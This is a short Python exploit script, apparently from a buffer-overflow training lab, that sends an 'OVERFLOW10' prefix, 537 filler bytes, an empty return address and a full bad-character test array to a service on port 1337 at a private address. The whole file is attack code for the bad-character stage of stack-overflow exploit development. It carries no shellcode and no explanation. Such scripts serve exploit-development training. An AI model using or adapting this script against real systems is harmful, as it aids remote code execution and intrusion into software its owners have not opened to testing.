import socket
from pwn import p32

ip = "10.10.163.123"
port = 1337
all_chars = bytearray(range(1, 256))
bad_chars = [
]

for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")


retn = b""
prefix = b"OVERFLOW10 "
offset = 537
overflow = b"A" * offset
padding = b""
bad_chars_buffer = all_chars

buffer = prefix + overflow + retn + padding + bad_chars_buffer

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer)
    print("Done!")
except socket.error as e:
    print("Could not connect.")
